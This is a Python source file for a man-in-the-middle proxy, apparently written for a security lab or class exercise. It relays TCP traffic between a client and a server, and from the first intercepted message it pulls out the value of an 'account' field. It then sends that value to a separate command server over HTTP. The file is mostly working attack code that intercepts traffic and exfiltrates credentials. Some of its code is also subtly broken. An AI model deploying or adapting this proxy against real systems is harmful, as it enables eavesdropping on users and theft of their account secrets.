#!/usr/bin/env python2
import traceback
import random
import socket
import argparse
from threading import Thread
import signal
import sys
import time
from contextlib import contextmanager
import datetime
import json, requests

running = True

class MITM:


    def __init__(self, c, d):
        signal.signal(signal.SIGTERM, self.signalhandler)
        self.messagesReceived = []
        self.commandhost = c
        self.commandport = d

    def signalhandler(sn, sf):
        global running
        running = False
        sys.exit()

    def start_operation(self, port, remotehost, remoteport):

        # Create server using TCP/IP socket
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.bind((remotehost, port))
        self._server.listen(3)
        self.targetport = remoteport
        self.remotehost = remotehost
        self.learned_secret = ""

        while running == True:
            k,a = self._server.accept()
            fragments = []
            chunk = k.recv(10000)
            fragments.append(chunk)

            message = b"".join(fragments)
            
            self.messagesReceived.append(message.decode())
            if len(self.messagesReceived) == 1:
                self.learned_secret = self.learn_from_message()
            v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            v.connect((self.remotehost, self.targetport))

            v.sendall(message)

            fragments = []
            chunk = v.recv(10000)
            fragments.append(chunk)

            message = b"".join(fragments)
            
            k.sendall(message)



            if len(self.messagesReceived) == 1:
                self.start_termination_thread()
                self.report_to_command_server(self.learned_secret)

        return

    def learn_from_message(self):
        strToFind = "\"account\""
        message_to_inspect = self.messagesReceived[-1]
        if strToFind in message_to_inspect:
            starting_index = message_to_inspect.find(strToFind) + len(strToFind) + 2
            
            answer = ""
            offset = 1
            while True:
                char = message_to_inspect[starting_index + offset]
                if char == "\"":
                    break
                answer += char
                offset += 1

            return answer

    def report_to_command_server(self, learned):
        try:

            if learned is None or learned == "":
                return

            secret = {
                        "type": "auth",
                        "account": learned
                    }
            
            request_data = json.dumps(secret)
            r = requests.post("http://" + self.commandhost + ":" + str(self.commandport), json={"REQUEST": request_data})
            # r = requests.post("http://localhost:" + str(8000), json={"REQUEST": request_data})
            

            response = json.dumps(r.text)
            if response["success"] == "false":
                print(response["error"], file=sys.stdout)

            r = requests.post("http://" + self.commandhost + ":" + str(self.commandport), json={"REQUEST": '{"type": "done"}'})

        except requests.exceptions.HTTPError as errh:
            print ("Http Error:",errh)
        except requests.exceptions.ConnectionError as errc:
            print ("Error Connecting:",errc)
        except requests.exceptions.Timeout as errt:
            print ("Timeout Error:",errt)
        except requests.exceptions.RequestException as err:
            print ("OOps: Something Else",err)


            
    def start_termination_thread(self):
        thread = Thread(target = terminate_after_time, args=(self.commandhost,self.commandport,))
        thread.start()


def terminate_after_time(commandhost,commandport):
    time.sleep(240)
    r = requests.post("http://" + commandhost + ":" + str(commandport), json={"REQUEST": '{"type": "done"}'})


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Proxy')
    parser.add_argument('-p', type=int, default=4000, help="listen port")
    parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
    parser.add_argument('-q', type=int, default=3000, help="server port")
    parser.add_argument('-c', type=str, default="127.0.0.1", help="command server")
    parser.add_argument('-d', type=int, default=5000, help="command port")
    args = parser.parse_args()

    print('started\n')
    sys.stdout.flush()
    MITM = MITM(args.c, args.d)
    MITM.start_operation(args.p, args.s, args.q)
